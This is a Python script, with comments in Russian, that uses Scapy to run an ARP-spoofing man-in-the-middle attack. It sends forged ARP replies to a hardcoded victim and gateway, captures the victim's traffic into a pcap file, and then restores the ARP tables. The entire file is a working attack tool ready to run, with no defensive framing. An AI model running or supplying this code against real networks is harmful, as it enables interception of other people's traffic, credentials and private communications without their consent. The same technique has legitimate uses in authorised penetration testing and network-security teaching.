from scapy.all import (ARP, conf, get_if_hwaddr, send, sniff, wrpcap)
from scapy_utils import get_mac_address, load_mac_addresses
import threading
import sys
import time
import logging

logging.basicConfig(level=logging.INFO)
mac_addresses = load_mac_addresses("output.txt")

class Arper:
    def __init__(self, victim, gateway, victimmac, gatewaymac, interface='en0'):
        self.victim = victim
        self.victimmac = victimmac
        self.gateway = gateway
        self.gatewaymac = gatewaymac
        self.interface = interface
        conf.iface = interface
        conf.verb = 0

        logging.info(f'Initialized {interface}:')
        logging.info(f'Gateway ({gateway}) is at {self.gatewaymac}.')
        logging.info(f'Victim ({victim}) is at {self.victimmac}.')
        logging.info('-' * 30)

        # Флаг для остановки потоков
        self.stop_flag = threading.Event()

    def run(self, packet_count=200):
        self.poison_thread = threading.Thread(target=self.poison)
        self.sniff_thread = threading.Thread(target=self.sniff, args=(packet_count,))

        self.poison_thread.start()
        self.sniff_thread.start()

    def poison(self):
        poison_victim = ARP(op=2, psrc=self.gateway, pdst=self.victim, hwdst=self.victimmac)
        poison_gateway = ARP(op=2, psrc=self.victim, pdst=self.gateway, hwdst=self.gatewaymac)

        logging.info(f'Starting ARP poisoning...')
        try:
            while not self.stop_flag.is_set():
                send(poison_victim, verbose=False)
                send(poison_gateway, verbose=False)
                time.sleep(2)  # Интервал отправки пакетов, можно регулировать для уменьшения нагрузки
        except KeyboardInterrupt:
            self.restore()
        finally:
            logging.info('ARP poisoning stopped.')

    def sniff(self, count=200):
        time.sleep(5)  # Задержка для стабилизации
        logging.info(f'Sniffing {count} packets')

        try:
            bpf_filter = f"ip host {self.victim}"
            packets = sniff(count=count, filter=bpf_filter, iface=self.interface)
            wrpcap('arper.pcap', packets)
            logging.info(f'Captured {len(packets)} packets and saved to arper.pcap')
        except Exception as e:
            logging.error(f"Error in sniffing: {e}")
        finally:
            self.stop_flag.set()  # Останавливаем отравление после захвата пакетов
            self.restore()

    def restore(self):
        logging.info('Restoring ARP tables...')
        send(ARP(op=2, psrc=self.gateway, hwsrc=self.gatewaymac, pdst=self.victim, hwdst='ff:ff:ff:ff:ff:ff'), count=5)
        send(ARP(op=2, psrc=self.victim, hwsrc=self.victimmac, pdst=self.gateway, hwdst='ff:ff:ff:ff:ff:ff'), count=5)
        logging.info('ARP tables restored.')

if __name__ == "__main__":
    victim_ip = '192.168.0.100'  # IP жертвы
    gateway_ip = '192.168.0.1'  # IP шлюза (маршрутизатора)
    network_interface = 'en0'  # Имя сетевого интерфейса
    victimmac = "b0:be:83:43:9e:9d"
    gatewaymac = "28:87:ba:8b:de:7c"

    try:
        logging.info("Запуск ARP Spoofing...")
        arper = Arper(victim_ip, gateway_ip, victimmac, gatewaymac, network_interface)
        arper.run(packet_count=200)
    except Exception as e:
        logging.error(f"Error occurred: {e}")
    except KeyboardInterrupt:
        logging.info("Execution interrupted by user.")
